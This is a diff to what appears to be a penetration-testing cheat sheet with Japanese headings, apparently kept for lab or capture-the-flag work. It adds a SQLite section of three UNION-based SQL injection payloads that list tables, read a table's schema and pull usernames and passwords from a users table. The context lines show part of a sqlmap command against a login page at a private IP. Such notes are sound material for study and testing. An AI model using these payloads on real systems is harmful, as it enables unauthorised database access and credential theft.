@@ -267,6 +267,16 @@ sqlmap -u "http://10.10.199.72/user_login.php" \
 --batch -v 3
 ```
 
+## SQLite
+
+```sql
+union select tbl_name,2 FROM sqlite_master WHERE type='table'--
+
+union select sql,2 FROM sqlite_master WHERE type<>'meta' AND sql NOT NULL AND name ='users'--
+
+union select username,password FROM users--
+```
+
 ## NoSQL
 
 ### 演算子インジェクション
